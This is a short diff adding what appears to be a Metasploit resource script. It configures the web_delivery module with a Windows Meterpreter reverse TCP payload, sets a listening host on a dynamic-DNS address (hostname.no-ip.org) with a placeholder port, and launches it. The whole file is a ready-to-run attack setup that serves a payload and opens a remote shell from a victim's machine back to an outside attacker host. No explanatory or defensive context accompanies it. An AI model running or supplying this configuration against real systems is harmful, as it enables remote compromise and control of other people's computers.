@@ -1,0 +1,8 @@
+use exploit/multi/script/web_delivery
+set TARGET 2
+set URIPATH /
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST hostname.no-ip.org
+set LPORT Your_Port
+exploit
+
